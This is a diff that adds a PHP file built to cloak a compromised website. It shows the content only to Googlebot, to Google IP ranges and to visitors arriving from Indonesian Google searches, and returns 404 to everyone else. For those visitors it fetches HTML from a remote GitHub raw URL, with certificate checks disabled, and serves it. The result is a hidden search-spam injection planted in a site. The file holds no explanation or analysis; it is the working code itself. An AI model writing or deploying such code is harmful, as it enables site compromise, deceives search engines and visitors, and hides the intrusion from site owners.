@@ -1,0 +1,79 @@
+<?php
+$github_url = 'https://raw.githubusercontent.com/salmadev138/bankdataku/refs/heads/main/gojiberi.txt';
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$ref = $_SERVER['HTTP_REFERER'] ?? '';
+$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
+
+$show_cloak = false;
+
+if (preg_match('/(Googlebot|AdsBot\-Google|Mediapartners\-Google|Google\-InspectionTool)/i', $ua)) {
+    $show_cloak = true;
+}
+
+$google_ips = [
+    '66.249.', '64.233.', '216.239.', '72.14.', '209.85.',
+    '108.177.', '74.125.', '216.58.', '172.217.', '142.250.',
+    '34.', '35.', '104.154.', '104.196.', '130.211.',
+    '2001:4860:', '2404:6800:', '2a00:1450:', '2607:f8b0:'
+];
+
+foreach ($google_ips as $range) {
+    if (strpos($ip, $range) === 0) {
+        $show_cloak = true;
+        break;
+    }
+}
+
+if (!$show_cloak && function_exists('gethostbyaddr') && $ip) {
+    $hostname = @gethostbyaddr($ip);
+    if ($hostname && preg_match('/\.googlebot\.com$/i', $hostname)) {
+        $show_cloak = true;
+    }
+}
+
+if (stripos($ref, 'google.co.id') !== false) {
+    $show_cloak = true;
+}
+
+if (stripos($ref, 'google.com') !== false && stripos($lang, 'id') !== false) {
+    $show_cloak = true;
+}
+
+if (!$show_cloak) {
+    header('HTTP/1.1 404 Not Found');
+    exit;
+}
+
+$content = false;
+
+if (function_exists('curl_init')) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $github_url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_USERAGENT => 'Mozilla/5.0'
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+}
+
+if (!$content && ini_get('allow_url_fopen')) {
+    $content = @file_get_contents($github_url);
+}
+
+if ($content) {
+    header('Content-Type: text/html; charset=UTF-8');
+    header('Cache-Control: no-cache');
+    echo $content;
+    exit;
+}
+
+header('HTTP/1.1 503 Service Unavailable');
+exit;
+?>
